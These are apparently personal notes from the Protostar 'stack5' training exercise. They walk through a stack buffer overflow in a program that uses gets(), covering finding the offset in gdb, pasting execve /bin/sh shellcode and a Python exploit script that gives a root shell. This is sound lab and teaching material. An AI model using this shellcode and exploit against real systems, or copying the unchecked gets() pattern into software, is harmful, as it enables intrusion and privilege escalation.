Source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```


Finding the offset

```bash
msf-pattern_create -l 80
```
![[Pasted image 20210725144929.png]]
```gdb
user@protostar:/opt/protostar/bin$ gdb  -q stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) r
Starting program: /opt/protostar/bin/stack5 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) info registers
eax            0xbffff770       -1073744016
ecx            0xbffff770       -1073744016
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7c0       0xbffff7c0
ebp            0x41346341       0x41346341
esi            0x0      0
edi            0x0      0
eip            0x63413563       0x63413563
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) 
```

eip = 0x63413563
esp = 0xbffff7c0

```bash
msf-pattern_offset -l 80 -q 0x63413563
```

![[Pasted image 20210725143146.png]]
offset = 76


/bin/sh shellcode: http://shell-storm.org/shellcode/files/shellcode-827.php

```shellcode
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

exploit.py

```python
import struct

padding = "A"* 76
addr=struct.pack("I",0xbffff7c0)

nopslide="\x90"*16

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

buffer = padding + addr + nopslide + shellcode

print buffer
```

```bash
user@protostar:/opt/protostar/bin$ (python /tmp/exploit.py;cat) |./stack5
whoami
root
```
![[Pasted image 20210725144702.png]]